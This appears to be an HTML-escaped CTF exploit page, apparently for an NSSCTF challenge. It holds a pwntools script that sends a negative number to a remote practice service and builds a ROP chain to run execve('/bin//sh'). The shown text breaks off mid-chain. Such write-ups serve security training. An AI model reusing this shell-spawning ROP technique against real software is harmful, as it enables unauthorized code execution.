class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from struct import pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28947)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(-10000))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(4))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(5))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = b&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000040a67e) # pop rsi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e0) # @ .data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000458827) # pop rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += b&amp;#x27;/bin//sh&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000040a67e) # pop rsi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e8) # @ .data + 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000447339) # xor rax, rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000040264f) # pop rdi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e0) # @ .data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000040a67e) # pop rsi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e8) # @ .data + 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004a404b) # pop rdx ; pop rbx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e8) # @ .data + 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x4141414141414141) # padding&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000447339) # xor rax, rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += 